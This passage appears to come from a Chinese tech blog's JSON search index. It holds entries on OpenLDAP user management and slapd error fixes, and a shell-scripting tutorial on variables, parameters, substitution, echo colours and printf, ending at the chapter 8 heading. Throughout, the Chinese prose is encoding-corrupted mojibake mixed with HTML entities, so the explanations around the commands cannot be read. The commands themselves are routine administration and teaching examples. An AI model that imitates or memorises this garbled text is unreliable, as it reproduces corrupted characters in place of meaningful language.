·ä¼šæŠŠç»‘å®šçš„ç”¨æˆ·èƒ½è®¿é—®\"uid=764,ou=users,dc=jollychic,dc=com\"ä¸‹çš„æ‰€æœ‰æ•°æ®æ˜¾ç¤ºå‡ºæ¥ã€‚ldapdelete -x -D \"cn=Manager,dc=jollychic,dc=com\" -W \"uid=900,ou=users,dc=jollychic,dc=com\" -Sldapmodifyå‘½ä»¤,åœ¨changetypeæ—¶è¾“å…¥ï¼šdeleteä¿®æ”¹ç”¨æˆ·å¯†ç ï¼šldappasswd -x -D \"cn=Manager,dc=jollychic,dc=com\" -W \"uid=900,ou=users,dc=jollychic,dc=com\" -SNew password:Re-enter new password:Enter LDAP Password:å°±å¯ä»¥æ›´æ”¹å¯†ç äº†ï¼Œå¦‚æœåŸæ¥è®°å½•ä¸­æ²¡æœ‰å¯†ç ï¼Œå°†ä¼šè‡ªåŠ¨ç”Ÿæˆä¸€ä¸ªuserPasswordã€‚##Enter LDAP password\" æ˜¯ \"cn=Manager,dc=jollychic,dc=com\"ç®¡ç†å‘˜çš„å¯†ç .ç®¡ç†å‘˜å¯†ç æ›´æ”¹#slappasswdNew passwordRe-enter new password","link":"/2017/03/03/OpenLDAP/ OpenLDAP ä¼ä¸šåº”ç”¨æ–¹æ¡ˆ -PPTè®¤è¯†LDAP+ç†Ÿæ‚‰æ“ä½œLDAPå‘½ä»¤/"},{"title":"OpenLDAP é”™è¯¯æ”¶é›†","text":"OpenLDAP é”™è¯¯æ”¶é›†å¯åŠ¨slapdæœåŠ¡ï¼šæŠ¥é”™ 12345678910Checking configuration files for slapd: [WARNING]bdb_db_open: warning â€“ no DB_CONFIG file found in directory /var/lib/ldap: (2).Expect poor performance for suffix â€œdc=my-domain,dc=comâ€.config file testing succeededæ“ä½œå‘½ä»¤ï¼šrm -rf /var/lib/ldap/*cp /usr/share/doc/openldap-servers-2.4.12/DB_CONFIG.example /var/lib/ldap/DB_CONFIGchown -R ldap:ldap /var/lib/ldap/etc/init.d/ldap restart slaptest -f /etc/openldap/slapd.conf -F /etc/openldap/slapd.d æŠ¥é”™ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950[root@yancy ldap]# slaptest -f /etc/openldap/slapd.conf -F /etc/openldap/slapd.d59842dbe bdb_db_open: database \"dc=jollychic,dc=com\": db_open(/var/lib/ldap/id2entry.bdb) failed: No such file or directory (2).59842dbe backend_startup_one (type=bdb, suffix=\"dc=jollychic,dc=com\"): bi_db_open failed! (2)slap_startup failed (test would succeed using the -u switch)è§£å†³æ“ä½œå‘½ä»¤ï¼šè§£å†³æ–¹æ³•ï¼š cp /usr/share/openldap-servers/DB_CONFIG.example /var/lib/ldap/DB_CONFIGchown -R ldap.ldap /var/lib/ldapç»§ç»­æ£€æŸ¥é…ç½®æ–‡ä»¶slaptest -f /etc/openldap/slapd.conf -F /etc/openldap/slapd.då¦‚æœè¿˜ç»§ç»­æŠ¥é”™ï¼šåˆ æ‰slapd.dä¸‹çš„æ–‡ä»¶ï¼Œé‡æ–°ç”Ÿæˆ ä¸ç„¶å¾…ä¼šå¯åŠ¨æ—¶ä¼šæŠ¥é”™[root@yancy ldap]# rm -rf slapd.d/*[root@yancy ldap]# cd /var/lib/ldap/[root@yancy ldap]# slapdæµ‹è¯• slapd.conf è®¾ç½® slaptest -ucp -a /etc/openldap/slapd.d/ /etc/openldap/slapd.dbakup0810rm -rf /etc/openldap/slapd.d/*chown ldap.ldap /var/lib/ldap/*chmod -R 600 /var/lib/ldap/*cd /var/lib/ldap/ &amp;&amp; slapdslaptest -f /etc/openldap/slapd.conf -F /etc/openldap/slapd.då¦‚æœè¿˜ä¸è¡Œï¼šrm -rf /etc/openldap/slapd.d/*rm -rf rm -rf /var/lib/ldap/__db.00*rm -rf /var/lib/ldap/alock/etc/init.d/slapd restartchown -R ldap:ldap /etc/openldap/slapd.dchown ldap.ldap /var/lib/ldap/*service slapd restart3. å¯¼å…¥æ•°æ®æŠ¥é”™ï¼š [root@H5 ldap]# ldapadd -x -D \"cn=Manager,dc=jollychic,dc=com\" -W -f /tmp/base.ldifEnter LDAP Password:adding new entry \"dc=jollychic,dc=com\"ldap_add: Server is unwilling to perform (53)additional info: shadow context; no update referral","link":"/2017/04/08/OpenLDAP/OpenLDAP é”™è¯¯æ”¶é›†/"},{"title":"shellå…¥é—¨åˆ°ç®€å• å­¦ä¹ æ€»ç»“1-12ç« ","text":"TOC[TOC] ç¬¬ä¸€ç« Shellå‰è¨€ï¼šShellæœ¬èº«æ˜¯ä¸€ç§ç”¨Cè¯­è¨€ç¼–å†™çš„ç¨‹åºï¼Œä»ç”¨æˆ·çš„è§’åº¦æ¥çœ‹ï¼ŒShellæ˜¯ç”¨æˆ·ä¸Linuxæ“ä½œç³»ç»Ÿæ²Ÿé€šçš„æ¡¥æ¢ã€‚ç”¨æˆ·æ—¢å¯ä»¥è¾“å…¥å‘½ä»¤æ‰§è¡Œï¼Œåˆå¯ä»¥åˆ©ç”¨ Shellè„šæœ¬ç¼–ç¨‹ï¼Œå®Œæˆæ›´åŠ å¤æ‚çš„æ“ä½œã€‚åœ¨Linux GUIæ—¥ç›Šå®Œå–„çš„ä»Šå¤©åœ¨è¿ç»´é¢†åŸŸShellç¼–ç¨‹ä»ç„¶èµ·ç€ä¸å¯å¿½è§†çš„ä½œç”¨ã€‚æ·±å…¥åœ°äº†è§£å’Œç†Ÿç»ƒåœ°æŒæ¡Shellç¼–ç¨‹ï¼Œæ˜¯æ¯ä¸€ä¸ªLinuxç”¨æˆ·çš„å¿…ä¿®ã€‚ 1.1 Linuxçš„Shellç§ç±»ï¼šBashåœ¨æ—¥å¸¸å·¥ä½œä¸­è¢«å¹¿æ³›ä½¿ç”¨ï¼ŒåŒæ—¶ï¼ŒBashä¹Ÿæ˜¯å¤§å¤šæ•°Linuxç³»ç»Ÿé»˜è®¤çš„Shell. ç»å¸¸å¯ä»¥çœ‹åˆ°#!/bin/shï¼Œå®ƒåŒæ ·ä¹Ÿå¯ä»¥æ”¹ä¸º#!/bin/bashã€‚ ç¬¬äºŒç« Shellè„šæœ¬æ ¼å¼1.1 ç¬¬ä¸€è¡Œ#!çš„ä½œç”¨æ˜¯æŒ‡å®šè¯¥è„šæœ¬ç¨‹åºçš„å‘½ä»¤è§£é‡Šå™¨ï¼š 123#!/bin/bashecho \"Hello the world\" 2.1 æ‰§è¡Œè„šæœ¬éœ€è¦æ·»åŠ æƒé™å’Œè¿è¡Œè„šæœ¬çš„æ–¹å¼ 12345chmod a+x print.sh å¦‚æœæ²¡æœ‰æƒé™é€šè¿‡bash/shæ–¹å¼ï¼šbash print.sh #è°ƒç”¨bashç¨‹åºè§£é‡Šå™¨è„šæœ¬å†…å®¹æ‰§è¡Œsh print.sh #è°ƒç”¨shç¨‹åºè§£é‡Šè„šæœ¬å†…å®¹å¹¶æ‰§è¡Œ ç¬¬ä¸‰ç« Shellå˜é‡shellå˜é‡å˜é‡æ˜¯shell ä¼ é€’æ•°æ®çš„ä¸€ç§æ–¹æ³•ã€‚å˜é‡æ˜¯ç”¨æ¥ä»£è¡¨æ¯ä¸ªå€¼çš„ç¬¦å·åã€‚ 1.1 Shell æœ‰ä¸¤ç±»å˜é‡ï¼šä¸´æ—¶å˜é‡å’Œæ°¸ä¹…å˜é‡ã€‚ ä¸´æ—¶å˜é‡: æ˜¯shell ç¨‹åºå†…éƒ¨å®šä¹‰çš„ï¼Œå…¶ä½¿ç”¨èŒƒå›´ä»…é™äºå®šä¹‰å®ƒçš„ç¨‹åºï¼Œå¯¹å…¶å®ƒç¨‹åºä¸å¯è§ã€‚æ°¸ä¹…å˜é‡: æ˜¯ç¯å¢ƒå˜é‡ï¼Œå…¶å€¼ä¸éšshell è„šæœ¬çš„æ‰§è¡Œç»“æŸè€Œæ¶ˆå¤±ã€‚ ä¾‹ï¼š 12[root@xuegod63 test]# echo $PATH/usr/lib64/qt-3.3/bin:/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/root/bin 2.1 ç”¨æˆ·å®šä¹‰å˜é‡ï¼šç”±å­—æ¯æˆ–ä¸‹åˆ’çº¿æ‰“å¤´ã€‚ ç”±å­—æ¯ã€æ•°å­—æˆ–ä¸‹åˆ’çº¿ç»„æˆï¼Œå¹¶ä¸”å¤§å°å†™å­—æ¯æ„ä¹‰ä¸åŒã€‚å˜é‡åé•¿åº¦æ²¡æœ‰é™åˆ¶ã€‚å¼•ç”¨å˜é‡å€¼æ—¶ï¼Œè¦åœ¨å˜é‡åå‰åŠ ä¸Šå‰ç¼€â€œ$â€ 12345[root@xuegod63 test]# A=aaa# echo $Aaaa[root@xuegod63 test]# A = aaabash: A: command not found 3.1 ä½ç½®å˜é‡å’Œç‰¹æ®Šå˜é‡ ä½ç½®å˜é‡ï¼šShellè§£é‡Šæ‰§è¡Œç”¨æˆ·çš„å‘½ä»¤æ—¶ï¼Œå°†å‘½ä»¤è¡Œçš„ç¬¬ä¸€ä¸ªå­—ä½œä¸ºå‘½ä»¤åï¼Œè€Œå…¶å®ƒå­—ä½œä¸ºå‚æ•°ã€‚ç”±å‡ºç°åœ¨å‘½ä»¤è¡Œä¸Šçš„ä½ç½®ç¡®å®šçš„å‚æ•°ç§°ä¸ºä½ç½®å‚æ•°ã€‚ä½ç½®å˜é‡ï¼šä½¿ç”¨$N æ¥è¡¨ç¤º 123[root@xuegod63 test]# ./example.sh file1 file2 file3$0 è¿™ä¸ªç¨‹åºçš„æ–‡ä»¶å example.sh$n è¿™ä¸ªç¨‹åºçš„ç¬¬nä¸ªå‚æ•°å€¼ï¼Œn=1..N 4.1 ç‰¹æ®Šå˜é‡ï¼š æœ‰äº›å˜é‡æ˜¯ä¸€å¼€å§‹æ‰§è¡ŒScriptè„šæœ¬æ—¶å°±ä¼šè®¾å®šï¼Œä¸”ä¸èƒ½è¢«ä¿®æ”¹ï¼Œä½†æˆ‘ä»¬ä¸å«å®ƒåªè¯»çš„ç³»ç»Ÿå˜é‡ï¼Œè€Œå«å®ƒç‰¹æ®Šå˜é‡ã€‚è¿™äº›å˜é‡å½“ä¸€æ‰§è¡Œç¨‹åºæ—¶å°±æœ‰äº†ï¼Œä»¥ä¸‹æ˜¯ä¸€äº›ç­‰æ®Šå˜é‡ï¼š 12345$* è¿™ä¸ªç¨‹åºçš„æ‰€æœ‰å‚æ•°$# è¿™ä¸ªç¨‹åºçš„å‚æ•°ä¸ªæ•°$ è¿™ä¸ªç¨‹åºçš„PID$! è¾“å‡ºä¸Šä¸€ä¸ªåå°ç¨‹åºçš„PID$? è¾“å‡ºä¸Šä¸€ä¸ªæŒ‡ä»¤çš„è¿”å›å€¼ 5.1 è‡ªå®šä¹‰ä½¿ç”¨å˜é‡ ä½¿ç”¨ä¸€ä¸ªå®šä¹‰è¿‡çš„å˜é‡ï¼Œåªè¦åœ¨å˜é‡åå‰é¢åŠ ç¾å…ƒç¬¦å·å³å¯ï¼Œå¦‚ï¼š â€¢ ä¸­é—´ä¸èƒ½æœ‰ç©ºæ ¼ï¼Œå¯ä»¥ä½¿ç”¨ä¸‹åˆ’çº¿ï¼ˆ_ï¼‰ã€‚â€¢ ä¸èƒ½ä½¿ç”¨æ ‡ç‚¹ç¬¦å·ã€‚â€¢ ä¸èƒ½ä½¿ç”¨bashé‡Œçš„å…³é”®å­—ï¼ˆå¯ç”¨helpå‘½ä»¤æŸ¥çœ‹ä¿ç•™å…³é”®å­—ï¼‰ã€‚ 12345678910111213[root@xuegod63 test]# cat expr.sh#! /bin/sha=10b=20c=30value1=`expr $a + $b + $c`echo \"The value of value1 is $value1\"value2=`expr $c / $b`echo \"The value of value2 is $value2\"value3=`expr $c \\* $b` #æ•´é™¤echo \"The value of value3 is $value3\"value4=`expr $a + $c / $b`echo \"The value of value4 is $value4\" æµ‹è¯•ï¼š 12345[root@xuegod63 test]# ./expr.shThe value of value1 is 60The value of value2 is 1The value of value3 is 600The value of value4 is 11 è¿™é‡Œåœ¨è¯´æ˜ç‚¹ï¼š å˜é‡åå¤–é¢çš„èŠ±æ‹¬å·æ˜¯å¯é€‰çš„ï¼ŒåŠ ä¸åŠ éƒ½è¡Œï¼ŒåŠ èŠ±æ‹¬å·æ˜¯ä¸ºäº†å¸®åŠ©è§£é‡Šå™¨è¯†åˆ«å˜é‡çš„è¾¹ç•Œï¼Œæ¯”å¦‚ä¸‹é¢è¿™ç§æƒ…å†µï¼š 1234for skill in Ada Coffe Action Javado echo \"I am good at $&#123;skill&#125;Script\"done å¦‚æœä¸ç»™skillå˜é‡åŠ èŠ±æ‹¬å·ï¼Œå†™æˆecho &quot;I am good at $skillScript&quot;ï¼Œè§£é‡Šå™¨å°±ä¼šæŠŠ$skillScriptå½“æˆä¸€ä¸ªå˜é‡ï¼ˆå…¶å€¼ä¸ºç©ºï¼‰ï¼Œä»£ç æ‰§è¡Œç»“æœå°±ä¸æ˜¯æˆ‘ä»¬æœŸæœ›çš„æ ·å­äº†ã€‚ æ¨èç»™æ‰€æœ‰å˜é‡åŠ ä¸ŠèŠ±æ‹¬å·ï¼Œè¿™æ˜¯ä¸ªå¥½çš„ç¼–ç¨‹ä¹ æƒ¯ã€‚ è¿™é‡Œåœ¨å˜é‡ä½¿ç”¨readï¼Œè¯¾å¤–è¡¥å……ï¼š readå‘½ä»¤æ¥æ”¶æ ‡å‡†è¾“å…¥ï¼ˆé”®ç›˜ï¼‰çš„è¾“å…¥ï¼Œæˆ–è€…å…¶ä»–æ–‡ä»¶æè¿°ç¬¦çš„è¾“å…¥ã€‚å¾—åˆ°è¾“å…¥åï¼Œreadå‘½ä»¤å°†æ•°æ®æ”¾å…¥ä¸€ä¸ªæ ‡å‡†å˜é‡ä¸­ã€‚ 123456789101.åŸºæœ¬è¯»å–#!/bin/bash echo -n \"Enter your name:\" #å‚æ•°-nçš„ä½œç”¨æ˜¯ä¸æ¢è¡Œï¼Œechoé»˜è®¤æ˜¯æ¢è¡Œ read name #ä»é”®ç›˜è¾“å…¥ echo \"hello $name, welcome to my program\" exit 0 #é€€å‡ºshellç¨‹åºã€‚å…¶ç­‰æ•ˆäºä»¥ä¸‹ï¼šread -p \"Enter your name:\" name #-på‚æ•°ï¼Œå…è®¸åœ¨readå‘½ä»¤è¡Œä¸­ç›´æ¥æŒ‡å®šä¸€ä¸ªæç¤º ä½¿ç”¨readå‘½ä»¤å­˜åœ¨ç€æ½œåœ¨å±é™©ã€‚è„šæœ¬å¾ˆå¯èƒ½ä¼šåœä¸‹æ¥ä¸€ç›´ç­‰å¾…ç”¨æˆ·çš„è¾“å…¥ã€‚å¦‚æœæ— è®ºæ˜¯å¦è¾“å…¥æ•°æ®è„šæœ¬éƒ½å¿…é¡»ç»§ç»­æ‰§è¡Œï¼Œé‚£ä¹ˆå¯ä»¥ä½¿ç”¨ -t é€‰é¡¹æŒ‡å®šä¸€ä¸ªè®¡æ—¶å™¨ï¼ŒæŒ‡å®šreadå‘½ä»¤ç­‰å¾…è¾“å…¥çš„ç§’æ•°ã€‚å½“è®¡æ—¶æ»¡æ—¶ï¼Œreadå‘½ä»¤è¿”å›éé›¶å€¼ï¼ˆ0ä¸ºæ­£å¸¸é€€å‡ºçŠ¶æ€ï¼‰; ä¸¾ä¾‹ï¼š 12345678#!/bin/bash if read -t 5 -p \"please enter your name:\" name then echo \"hello $name, welcome to my script\" else echo \"sorry,too slow\" fi exit 0 ç¬¬å››ç« Shellç‰¹æ®Šå˜é‡ï¼š$0,$#,$*,$@,$?,$$å’Œå‘½ä»¤è¡Œå‚æ•°æˆ‘ä»¬å¯ä»¥åœ¨æ‰§è¡Œ Shell è„šæœ¬æ—¶ï¼Œå‘è„šæœ¬ä¼ é€’å‚æ•°ï¼Œè„šæœ¬å†…è·å–å‚æ•°çš„æ ¼å¼ä¸ºï¼š$nã€‚n ä»£è¡¨ä¸€ä¸ªæ•°å­—ï¼Œ1 ä¸ºæ‰§è¡Œè„šæœ¬çš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œ2 ä¸ºæ‰§è¡Œè„šæœ¬çš„ç¬¬äºŒä¸ªå‚æ•°ï¼Œä»¥æ­¤ç±»æ¨â€¦â€¦ ä¸‹é¢æ˜¯$å…¶ä»–å‚æ•°ä½¿ç”¨æ–¹æ³•,ä¸€èˆ¬ç”¨çš„æ¯”è¾ƒå¤šçš„éƒ½æ˜¯ä¼ é€’è„šæœ¬å‚æ•°ï¼š 1234567$# ä¼ é€’åˆ°è„šæœ¬çš„å‚æ•°ä¸ªæ•°$* ä»¥ä¸€ä¸ªå•å­—ç¬¦ä¸²æ˜¾ç¤ºæ‰€æœ‰å‘è„šæœ¬ä¼ é€’çš„å‚æ•°ã€‚å¦‚\"$*\"ç”¨ã€Œ\"ã€æ‹¬èµ·æ¥çš„æƒ…å†µã€ä»¥\"$1 $2 â€¦ $n\"çš„å½¢å¼è¾“å‡ºæ‰€æœ‰å‚æ•°ã€‚$$ è„šæœ¬è¿è¡Œçš„å½“å‰è¿›ç¨‹IDå·$! åå°è¿è¡Œçš„æœ€åä¸€ä¸ªè¿›ç¨‹çš„IDå·$@ ä¸$*ç›¸åŒï¼Œä½†æ˜¯ä½¿ç”¨æ—¶åŠ å¼•å·ï¼Œå¹¶åœ¨å¼•å·ä¸­è¿”å›æ¯ä¸ªå‚æ•°ã€‚å¦‚\"$@\"ç”¨ã€Œ\"ã€æ‹¬èµ·æ¥çš„æƒ…å†µã€ä»¥\"$1\" \"$2\" â€¦ \"$n\" çš„å½¢å¼è¾“å‡ºæ‰€æœ‰å‚æ•°ã€‚$- æ˜¾ç¤ºShellä½¿ç”¨çš„å½“å‰é€‰é¡¹ï¼Œä¸setå‘½ä»¤åŠŸèƒ½ç›¸åŒã€‚$? æ˜¾ç¤ºæœ€åå‘½ä»¤çš„é€€å‡ºçŠ¶æ€ã€‚0è¡¨ç¤ºæ²¡æœ‰é”™è¯¯ï¼Œå…¶ä»–ä»»ä½•å€¼è¡¨æ˜æœ‰é”™è¯¯ã€‚ è¿™ä¸ªè·Ÿæˆ‘ä»¬è‡ªå®šä¹‰å˜é‡æœ‰ç‚¹åŒºåˆ«ï¼Œ çœ‹ä¾‹å­è„šæœ¬ï¼š 12345678910111213#!/bin/bash#author=yangc#blog.yangcvo.meecho \"shell è„šæœ¬å¾ˆå¥½ç”¨1ï¼š$1\";echo \"shell è„šæœ¬å¾ˆå¥½ç”¨2ï¼š$2\";echo \"shell è„šæœ¬å¾ˆå¥½ç”¨3ï¼š$3\";echo \"File Name: $0\"echo \"First Parameter : $1\"echo \"First Parameter : $2\"echo \"Quoted Values: $@\"echo \"Quoted Values: $*\"echo \"Total Number of Parameters : $#\" ä½¿ç”¨è„šæœ¬ä¼ é€’å‚æ•°ï¼š 123456789shell è„šæœ¬å¾ˆå¥½ç”¨1ï¼š3shell è„šæœ¬å¾ˆå¥½ç”¨2ï¼š4shell è„šæœ¬å¾ˆå¥½ç”¨3ï¼š6File Name: sh.shFirst Parameter : 3First Parameter : 4Quoted Values: 3 4 6Quoted Values: 3 4 6Total Number of Parameters : 3 ç¬¬äº”ç«  Shellæ›¿æ¢ï¼šShellå˜é‡æ›¿æ¢ï¼Œå‘½ä»¤æ›¿æ¢ï¼Œè½¬ä¹‰å­—ç¬¦å¦‚æœè¡¨è¾¾å¼ä¸­åŒ…å«ç‰¹æ®Šå­—ç¬¦ï¼ŒShell å°†ä¼šè¿›è¡Œæ›¿æ¢ã€‚ä¾‹å¦‚ï¼Œåœ¨åŒå¼•å·ä¸­ä½¿ç”¨å˜é‡å°±æ˜¯ä¸€ç§æ›¿æ¢ï¼Œè½¬ä¹‰å­—ç¬¦ä¹Ÿæ˜¯ä¸€ç§æ›¿æ¢ã€‚ 123#!/bin/basha=10echo -e \"Value of a is $a \\n\" è¿è¡Œç»“æœï¼š 1Value of a is 10 è¿™é‡Œ -e è¡¨ç¤ºå¯¹è½¬ä¹‰å­—ç¬¦è¿›è¡Œæ›¿æ¢ã€‚å¦‚æœä¸ä½¿ç”¨ -e é€‰é¡¹ï¼Œå°†ä¼šåŸæ ·è¾“å‡ºï¼š 1Value of a is 10\\n 2.1 å‘½ä»¤æ›¿æ¢ å‘½ä»¤æ›¿æ¢æ˜¯æŒ‡Shellå¯ä»¥å…ˆæ‰§è¡Œå‘½ä»¤ï¼Œå°†è¾“å‡ºç»“æœæš‚æ—¶ä¿å­˜ï¼Œåœ¨é€‚å½“çš„åœ°æ–¹è¾“å‡ºã€‚ 1234567#!/bin/bashDATE=`date`echo \"Date is $DATE\"USERS=`who | wc -l`echo \"Logged in user are $USERS\"UP=`date ; uptime`echo \"Uptime is $UP\" è¿è¡Œç»“æœï¼š 1234Date is 2017å¹´ 04æœˆ 28æ—¥ æ˜ŸæœŸäº” 11:41:34 CSTLogged in user are 1Uptime is 2017å¹´ 04æœˆ 28æ—¥ æ˜ŸæœŸäº” 11:41:34 CST11:41:34 up 266 days, 10:43, 1 user, load average: 0.33, 0.14, 0.11 ç¬¬å…­ç« Shellæ³¨é‡Šä»¥â€œ#â€å¼€å¤´çš„è¡Œå°±æ˜¯æ³¨é‡Šï¼Œä¼šè¢«è§£é‡Šå™¨å¿½ç•¥ã€‚è¿™é‡Œå› ä¸ºå¾ˆå¤šå†™è„šæœ¬éƒ½å¸¦æœ‰ä¸ªæ€§çš„é£æ ¼ï¼Œè¿™æ ·å†™çš„æ›´åŠ æœ‰ä¹è¶£ã€‚ shé‡Œæ²¡æœ‰å¤šè¡Œæ³¨é‡Šï¼Œåªèƒ½æ¯ä¸€è¡ŒåŠ ä¸€ä¸ª#å·ã€‚åªèƒ½åƒè¿™æ ·ï¼š 12345678910111213#--------------------------------------------# è¿™æ˜¯ä¸€ä¸ªè‡ªåŠ¨æ‰“ipaçš„è„šæœ¬ï¼ŒåŸºäºwebfrogsçš„ipa-buildä¹¦å†™ï¼š# https://github.com/webfrogs/xcode_shell/blob/master/ipa-build# åŠŸèƒ½ï¼šè‡ªåŠ¨ä¸ºetao ios appæ‰“åŒ…ï¼Œäº§å‡ºç‰©ä¸º14ä¸ªæ¸ é“çš„ipaåŒ…# ç‰¹è‰²ï¼šå…¨è‡ªåŠ¨æ‰“åŒ…ï¼Œä¸éœ€è¦è¾“å…¥ä»»ä½•å‚æ•°#--------------------------------------------##### ç”¨æˆ·é…ç½®åŒº å¼€å§‹ ######## é¡¹ç›®æ ¹ç›®å½•ï¼Œæ¨èå°†æ­¤è„šæœ¬æ”¾åœ¨é¡¹ç›®çš„æ ¹ç›®å½•ï¼Œè¿™é‡Œå°±ä¸ç”¨æ”¹äº†# åº”ç”¨åï¼Œç¡®ä¿å’ŒXcodeé‡ŒProductä¸‹çš„target_name.appåå­—ä¸€è‡´###### ç”¨æˆ·é…ç½®åŒº ç»“æŸ ##### å¦‚æœåœ¨å¼€å‘è¿‡ç¨‹ä¸­ï¼Œé‡åˆ°å¤§æ®µçš„ä»£ç éœ€è¦ä¸´æ—¶æ³¨é‡Šèµ·æ¥ï¼Œè¿‡ä¸€ä¼šå„¿åˆå–æ¶ˆæ³¨é‡Šï¼Œæ€ä¹ˆåŠå‘¢ï¼Ÿæ¯ä¸€è¡ŒåŠ ä¸ª#ç¬¦å·å¤ªè´¹åŠ›äº†ï¼Œå¯ä»¥æŠŠè¿™ä¸€æ®µè¦æ³¨é‡Šçš„ä»£ç ç”¨ä¸€å¯¹èŠ±æ‹¬å·æ‹¬èµ·æ¥ï¼Œå®šä¹‰æˆä¸€ä¸ªå‡½æ•°ï¼Œæ²¡æœ‰åœ°æ–¹è°ƒç”¨è¿™ä¸ªå‡½æ•°ï¼Œè¿™å—ä»£ç å°±ä¸ä¼šæ‰§è¡Œï¼Œè¾¾åˆ°äº†å’Œæ³¨é‡Šä¸€æ ·çš„æ•ˆæœã€‚ ç¬¬ä¸ƒç« Shell echoå‘½ä»¤å’Œprintfå‘½ä»¤ï¼šæ ¼å¼åŒ–è¾“å‡ºè¯­å¥echoæ˜¯Shellçš„ä¸€ä¸ªå†…éƒ¨æŒ‡ä»¤ï¼Œç”¨äºåœ¨å±å¹•ä¸Šæ‰“å°å‡ºæŒ‡å®šçš„å­—ç¬¦ä¸²ã€‚å‘½ä»¤æ ¼å¼ï¼š 1.1 æ˜¾ç¤ºè½¬ä¹‰å­—ç¬¦ 123echo \"\\\"It is a test\\\"\"æ‰§è¡Œç»“æœå°†æ˜¯ï¼š\"It is a test\" æ˜¾ç¤ºå˜é‡ 12345name=\"OK\"echo \"$name It is a test\"æ‰§è¡Œç»“æœå°†æ˜¯ï¼šOK It is a test åŒæ ·åŒå¼•å·ä¹Ÿå¯ä»¥çœç•¥ã€‚ 2.1 shell è„šæœ¬ä¸­echo é¢œè‰²æ˜¾ç¤ºå†…å®¹ è¿™é‡Œæˆ‘å› ä¸ºä¹‹å‰åœ¨å­¦ä¹ shellæ²¡æœ‰æ˜ç¡®æåˆ°è¿™ä¸ªï¼Œè¿™é‡Œæˆ‘è‡ªå·±æ€»ç»“å°±åŠ è¿›æ¥ï¼Œå› ä¸ºå¾ˆå¤šæ¬¡çœ‹åˆ°ä¸“ä¸šå›¢é˜Ÿå†™shellè·‘æ•´ä¸ªè„šæœ¬è¿‡ç¨‹ï¼Œç‰¹åˆ«èˆ’æœï¼Œå¼€å¤´æœ‰æç¤ºé¢œè‰²è¯´æ˜ï¼Œç‰¹åˆ«æ˜¯å›½å¤–å“ªäº›äººå†™çš„ä¸æ­¢å¥½ç”¨ï¼Œè€Œä¸”è„šæœ¬è·‘èµ·æ¥ä¹Ÿå¾ˆæœ‰æ„æ€ã€‚ åé¢æˆ‘å†™è„šæœ¬éƒ½ä¼šè¯¥æ³¨æ„å’Œæç¤ºéƒ½ä¼šæœ‰çªå‡ºé¢œè‰²æ ‡æ³¨ã€‚(è¿™æ˜¯ä¸ªå¥½ä¹ æƒ¯) shellè„šæœ¬ä¸­echoæ˜¾ç¤ºå†…å®¹å¸¦é¢œè‰²æ˜¾ç¤º,echoæ˜¾ç¤ºå¸¦é¢œè‰²ï¼Œéœ€è¦ä½¿ç”¨å‚æ•° -e è„šæœ¬ä¸¾ä¾‹ï¼š 1echo -e \"\\033[å­—èƒŒæ™¯é¢œè‰²ï¼›æ–‡å­—é¢œè‰²må­—ç¬¦ä¸²\\033[0m\" ä¾‹å¦‚ï¼š 1echo -e \"\\033[41;36m something here \\033[0m\" å…¶ä¸­41çš„ä½ç½®ä»£è¡¨åº•è‰²ï¼Œ 36çš„ä½ç½®æ˜¯ä»£è¡¨å­—çš„é¢œè‰². âš ï¸æ³¨ï¼š 1ã€å­—èƒŒæ™¯é¢œè‰²å’Œæ–‡å­—é¢œè‰²ä¹‹é—´æ˜¯è‹±æ–‡çš„â€â€ 2ã€æ–‡å­—é¢œè‰²åé¢æœ‰ä¸ªm 3ã€å­—ç¬¦ä¸²å‰åå¯ä»¥æ²¡æœ‰ç©ºæ ¼ï¼Œå¦‚æœæœ‰çš„è¯ï¼Œè¾“å‡ºä¹Ÿæ˜¯åŒæ ·æœ‰ç©ºæ ¼ ä¸‹é¢æ˜¯ç›¸åº”çš„å­—å’ŒèƒŒæ™¯é¢œè‰²ï¼Œå¯ä»¥è‡ªå·±æ¥å°è¯•æ‰¾å‡ºä¸åŒé¢œè‰²æ­é… 1234unset -f pathmungeecho -e '\\t\\t\\t\\t\\t\\e[1;31mç™»å½•æƒ…å†µ\\e[0m\\n'last -n 6|naliuptime è¿™é‡Œè´¡çŒ®ä¸‹ä»£ç é¢œè‰²ï¼š 123456789101112 echo -e â€œ\\033[30m é»‘è‰²å­— \\033[0mâ€ echo -e â€œ\\033[31m çº¢è‰²å­— \\033[0mâ€ echo -e â€œ\\033[32m ç»¿è‰²å­— \\033[0mâ€ echo -e â€œ\\033[33m é»„è‰²å­— \\033[0mâ€ echo -e â€œ\\033[34m è“è‰²å­— \\033[0mâ€ echo -e â€œ\\033[35m ç´«è‰²å­— \\033[0mâ€ echo -e â€œ\\033[36m å¤©è“å­— \\033[0mâ€ echo -e â€œ\\033[37m ç™½è‰²å­— \\033[0mâ€ echo -e \"\\t\\t\\t\\t\\t\\t\\e[1;31m æœ€è¿‘5æ¬¡ç™»å½•åœ°å€ä¿¡æ¯ \\e[0m\"last -5 | naliecho -e \"\\t\\t\\t\\t\\t\\t\\e[2;32m æœåŠ¡å™¨å½“å‰æ€§èƒ½è´Ÿè½½æƒ…å†µ \\e[0m\"uptime æŸ¥çœ‹æ•ˆæœï¼š æ•ˆæœå›¾ 3.1 printf å‘½ä»¤ç”¨äºæ ¼å¼åŒ–è¾“å‡ºï¼Œ æ˜¯echoå‘½ä»¤çš„å¢å¼ºç‰ˆã€‚å®ƒæ˜¯Cè¯­è¨€printf()åº“å‡½æ•°çš„ä¸€ä¸ªæœ‰é™çš„å˜å½¢ï¼Œå¹¶ä¸”åœ¨è¯­æ³•ä¸Šæœ‰äº›ä¸åŒã€‚ æ³¨æ„ï¼šprintf ç”± POSIX æ ‡å‡†æ‰€å®šä¹‰ï¼Œç§»æ¤æ€§è¦æ¯” echo å¥½ã€‚ ä¸¾ä¾‹ï¼š 12345678910111213# æ²¡æœ‰å¼•å·ä¹Ÿå¯ä»¥è¾“å‡º$ printf %s abcdefabcdef# æ ¼å¼åªæŒ‡å®šäº†ä¸€ä¸ªå‚æ•°ï¼Œä½†å¤šå‡ºçš„å‚æ•°ä»ç„¶ä¼šæŒ‰ç…§è¯¥æ ¼å¼è¾“å‡ºï¼Œformat-string è¢«é‡ç”¨$ printf %s abc defabcdef$ printf \"%s\\n\" abc defabcdef$ printf \"%s %s %s\\n\" a b c d e f g h i ja b cd e fg h i ç¬¬å…«ç«  Shell if else 